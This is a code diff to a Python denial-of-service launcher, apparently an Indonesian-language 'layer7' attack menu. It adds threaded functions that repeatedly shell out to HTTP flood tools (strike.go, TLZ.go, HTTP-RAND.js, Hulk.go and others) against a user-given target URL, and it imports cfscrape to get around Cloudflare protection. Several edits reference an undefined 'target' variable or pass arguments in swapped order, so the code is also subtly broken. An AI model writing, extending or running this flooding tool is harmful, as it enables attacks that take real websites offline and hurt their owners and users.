@@ -18,6 +18,7 @@ import getpass
 import json
 import httpx
 import undetected_chromedriver as webdriver
+import cfscrape
 
 from operator import index
 from colorama import Fore, Back
@@ -494,7 +495,7 @@ def LaunchStrike(url, th, t):
 def AttackStrike(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            os.system(f'cd godzilla && go run strike.go -url {url} GET')
+            os.system(f'cd godzilla && go run strike.go -url {target} GET')
         except IndexError:
             #pass
             print('Usage: strike <url> <method> GET')
@@ -1088,13 +1089,29 @@ def Launchtlz(url, th, t):
 def Attacktlz(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
+            os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
         except IndexError:
             #pass
             print('coba cek lagi')
             print('udah bener belum ngisi nya')
 
+def LaunchRand(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackRand, args=(url, until))
+            thd.start()
+        except:
+            pass
 
+def AttackRand(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            os.system(f'cd godzilla && node HTTP-RAND.js {target} {t}')
+        except IndexError:
+            #pass
+            print('Usage: strike <url> <method> GET')
+            print('Example: strike https://example.com GET')
 
 
 
@@ -1223,7 +1240,7 @@ def layer7_2():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"       COMMAND"+Fore.LIGHTGREEN_EX+""+Fore.LIGHTWHITE_EX+"LIST                                   "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════════════║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"tlz        "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"https2     "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"samp       "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk2      "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-flood "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-rand  "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1544,29 +1561,15 @@ def command():
         except IndexError:
             print('cek lagi')
             print('isi methode dengan get/post')
+            
 
-    elif command == "HTTP-RAND" or command == "http-rand" :
-        try:
-            target, thread, t = get_info_l7()
-            picture()
-            os.system(f'cd godzilla && node HTTP-RAND.js {target} {t}')
-        except IndexError:
-            print('cek lagi')
-            print('isi semua pertanyaan dengan benar')
-
-    elif command == "HTTPS2" or command == "https2" :
-        try:
-            target, thread, methode, t = get_info_l72()
-            picture()
-            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data GET')
-            os.system(f'cd godzilla && go run CTA.go -site {target} -data GET')
-            os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
-            os.system(f'cd godzilla && go run strike.go -url {target} -method GET')
-            os.system(f'cd godzilla && go run Low.go -site {target} -data GET')
-            os.system("clear")
-        except IndexError:
-            print('cek lagi')
-            print('isi semua pertanyaan dengan benar')
+    elif command == "http-rand":
+        target, thread, t = get_info_l7()
+        picture()
+        threading.Thread(target=LaunchRand, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
             
     elif command == "SAMP" or command == "samp":
         try:
